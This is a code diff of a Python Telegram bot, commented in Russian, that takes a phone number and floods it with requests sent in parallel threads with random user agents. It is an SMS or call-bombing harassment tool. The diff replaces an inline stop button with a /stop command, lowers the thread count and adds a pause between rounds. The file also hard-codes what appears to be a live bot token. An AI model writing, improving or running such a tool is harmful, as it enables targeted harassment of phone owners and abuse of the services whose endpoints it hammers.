@@ -4,7 +4,7 @@ from fake_useragent import UserAgent
 import threading
 import concurrent.futures
 import re
-from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
+import time
 
 bot = telebot.TeleBot("8676884588:AAFy8GLWAfTExVAqHLbbf_qIOPPxgNkQOfE")
 
@@ -35,6 +35,14 @@ active = {}
 def start(msg):
     bot.reply_to(msg, "кидай номер")
 
+@bot.message_handler(commands=['stop'])
+def stop_cmd(msg):
+    if msg.chat.id in active:
+        active[msg.chat.id]['stop'] = True
+        bot.reply_to(msg, "останавливаю")
+    else:
+        bot.reply_to(msg, "нет активного спама")
+
 @bot.message_handler(func=lambda m: True)
 def handle_num(msg):
     txt = msg.text.strip()
@@ -45,9 +53,7 @@ def handle_num(msg):
     if msg.chat.id in active:
         bot.reply_to(msg, "уже хуярит")
         return
-    keyboard = InlineKeyboardMarkup()
-    keyboard.add(InlineKeyboardButton("СТОП", callback_data="stop"))
-    sent = bot.reply_to(msg, f"спамлю на {num}", reply_markup=keyboard)
+    sent = bot.reply_to(msg, f"спамлю на {num}")
     def worker(chat_id, phone, msg_id):
         ua = UserAgent()
         session = requests.Session()
@@ -56,7 +62,7 @@ def handle_num(msg):
         active[chat_id] = {'stop': False, 'thread': threading.current_thread()}
         try:
             while not active[chat_id]['stop']:
-                with concurrent.futures.ThreadPoolExecutor(max_workers=100) as ex:
+                with concurrent.futures.ThreadPoolExecutor(max_workers=50) as ex:
                     futures = []
                     for ep in endpoints:
                         headers = {'user-agent': ua.random}
@@ -74,19 +80,12 @@ def handle_num(msg):
                             pass
                 if stop:
                     break
+                time.sleep(1)
         finally:
             if chat_id in active:
                 del active[chat_id]
         bot.edit_message_text(f"остановил спам всего запросов {total}", chat_id, msg_id)
     threading.Thread(target=worker, args=(msg.chat.id, num, sent.message_id), daemon=True).start()
-
-@bot.callback_query_handler(func=lambda call: call.data == "stop")
-def stop_cb(call):
-    if call.message.chat.id in active:
-        active[call.message.chat.id]['stop'] = True
-        bot.answer_callback_query(call.id, "останавливаю")
-    else:
-        bot.answer_callback_query(call.id, "нет активного")
 
 if __name__ == '__main__':
     bot.infinity_polling()
